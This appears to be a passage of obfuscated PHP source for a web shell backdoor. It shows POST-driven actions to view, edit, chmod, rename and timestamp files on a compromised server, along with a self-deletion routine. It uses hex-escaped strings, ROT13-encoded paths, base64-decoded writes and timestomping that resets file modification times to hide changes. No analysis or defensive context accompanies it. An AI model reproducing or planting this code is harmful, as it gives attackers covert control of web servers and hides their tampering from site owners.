onclick=\x22g(nu\x6cl,null,\047".urLeNCoDE(STR_rOt13($_POST["p"]))."',\x27".Strtolower($_kg)."\x27)\042\x3e".((sTRtOLoWer($_kg)==$_POST["x"])?"<b>[ ".$_kg." ]</b>":$_kg)."</a\076 ";echo"<br><br\x3e";switch($_POST["x"]){case "view":echo"\074pre c\x6ca\x73s=ml1>";$_tdtc=@fopEn($_POST["p"],"r");if($_tdtc){while(!@FEOF($_tdtc))echo hTMLspECiaLcHARs(@fGeTS($_tdtc,487-872- -1409));@FcLosE($_tdtc);}echo"\x3c/pre>";break;case "chm\x6fd":if(!empty($_POST["s"])){$_dghz=(int)round(0+0+0);for($_wvlc=StRLEn($_POST["s"])-(int)round(0.5+0.5);$_wvlc>=(int)round(0+0);--$_wvlc)$_dghz+=(int)$_POST["s"][$_wvlc]*poW(-5- -13,(StrLEn($_POST["s"])-$_wvlc-(-37+38)));if(!@ChmOd($_POST["p"],$_dghz))echo"Can't \x73e\x74 permissions!<br><sc\x72ipt>d\x6fcume\x6et.mf.s.value\x3d\x22\x22;<\057scrip\x74>";}cLeArsTATcaChe();echo"<script>s_=\042\042;</script><form onsubm\x69t=\x22g(n\165ll,null,'".urlENCoDE(stR_Rot13($_POST["p"]))."',null,this.ch\155od.value);return \146a\x6cse;\042><inp\165t type=text name=chmod valu\145=\042".subSTr(SPRiNTF("%o",filEPeRMS($_POST["p"])),-(181-177))."\x22><input type=s\165bmit value=\x22>>\042></form>";break;case "edit":if(!IS_wRitAblE($_POST["p"])){echo"File \151sn't writ\145able";break;}if(!empty($_POST["s"])){$_rdbd=@FILemtIMe($_POST["p"]);$_POST["s"]=SUbstr($_POST["s"],(int)round(0.5+0.5));$_POST["s"]=baSE64_dECoDe($_POST["s"]);$_tdtc=@FOPen($_POST["p"],"w");if($_tdtc){@fputs($_tdtc,$_POST["\x73"]);@FClOSe($_tdtc);echo"Sa\x76ed!<b\162><script>s_=\x22\x22;</sc\x72\151pt>";}}echo"<form\040ons\x75bmit=\042\147(null,null,'".UrLenCoDE(sTr_Rot13($_POST["p"]))."',null\054\x271'+uto\x61\x28this.tex\164.value));return false\073\042><textarea nam\x65=te\170t class=bigarea>";$_tdtc=@FOpen($_POST["\160"],"r");if($_tdtc){while(!@feOf($_tdtc))echo HtmLsPeCIAlcHArS(@fgETS($_tdtc,1218+-194));@FClOse($_tdtc);}echo"</textarea><i\x6eput \164ype\x3dsu\x62mi\164 value=\x22\123ave\x22></form>";if($_rdbd)TOUcH($_POST["p"],$_rdbd,$_rdbd);break;case "rename":$_ujhi=@fILeMTImE($_POST["c"]);if(!empty($_POST["s"])){if(!@RenAMe($_POST["p"],stR_ROt13($_POST["s"])))echo"Can\047t\040rename!<br\076";else{if($_ujhi)ToUCH($_POST["c"],$_ujhi,$_ujhi);die("<scri\x70\164>g(null,null,\042".UrLenCODe($_POST["s"])."\x22,null,\x22\042)</script>");}}echo"<for\155 onsubmit=\x22g(nu\154l,null,'".UrlENCoDE(sTR_Rot13($_POST["p"]))."',null\054r\x6f\16413(this.nam\145\x2eva\x6cue));retu\162n false;\042><inp\165t type=text name=name val\165e=\x22".htMLSPeCIAlcharS($_POST["p"])."\x22><\151\x6eput t\171pe=submit value=\x22>>\042><\x2ffor\155>";break;case "to\x75ch":if(!empty($_POST["s"])){$_rdbd=stRTOTImE($_POST["s"]);if($_rdbd){if(!TOuCH($_POST["p"],$_rdbd,$_rdbd))echo"Fa\x69l!";else echo"T\x6fuched!";}else echo"Bad time fo\162mat!";}CleArSTatcACHe();echo"<script>s_=\x22\x22;</\163c\162\151pt\x3e<form onsubmit=\x22g(null,null,'".uRLeNCOde(STR_roT13($_POST["p"]))."',n\165ll,this.touch.value);r\145\164urn\x20false;\042><input t\x79pe=text \156a\155e=touc\150 v\141lue=\042".DAtE("Y-m-d\040H:i:s",@FilEmtIMe($_POST["p"]))."\x22\076<in\160ut type=submi\164 value=\042>>\042></f\157r\155>";break;}echo"</div>";_Û–˜Ò();}function acTiOnLogout(){SetCoOkIe($GLOBALS["coo\153"],"",TiME()-(int)round(1800+1800));die("bye!");}function _¯€›(){if($_POST["p"]=="yes")if(@UNLinK(PreG_replace("!\134(\x5cd+\x5c)\134s\056\052!","",__FILE__)))die("Shell has \x62een rem\157ved");else echo"unlink error\x21";if($_POST["p"]!="yes")_Ø‰’();echo"<h1>S\x75ici\144e</h1><di\166 \x63lass=content>Real\x6cy want \164o remo\166e\x20the \163hell?\x3cbr><a\x20h\x72ef=# \x6fnclick=\042g(\156ull,null,'yes')\042>\x59es</a></div>";_Û–˜Ò();}if(empty($_POST["a"]))if(isset($_smp)&&FUncTiON_eXISTS("a\x63tion".$_smp))$_POST["a"]=$_smp;if(!empty($_POST["a"])&&FUNction_EXIstS("action".$_POST["a"]))CAll_user_FUNc("action".$_POST["a"]);exit;
